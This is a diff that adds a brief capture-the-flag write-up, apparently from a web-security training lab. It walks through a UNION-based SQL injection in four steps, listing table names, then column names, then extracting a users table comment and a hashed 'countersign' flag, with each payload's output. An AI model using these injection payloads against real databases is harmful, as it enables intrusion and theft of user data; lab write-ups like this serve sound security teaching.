@@ -1,0 +1,15 @@
+1 - Get tables name in the DB
+0 OR 1 = 2 UNION SELECT table_schema, table_name FROM information_schema.TABLES
+==> db_default, users, guestbook, list_images, vote_dbs
+
+2 - find table columns in the DB for each table
+0 OR 1 = 2 UNION SELECT table_name, column_name FROM information_schema.COLUMNS
+==>  user_id, first_name, last_name, town, country, planet, Commentaire, countersign
+
+3 - get data from users table
+0 OR 1 = 2 UNION SELECT first_name, Commentaire FROM users
+==> #Commentaire = Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+
+4 - get flag
+0 OR 1 = 2 UNION SELECT first_name, countersign FROM users
+==> countersign = 5ff9d0165b4f92b14994e5c685cdce28
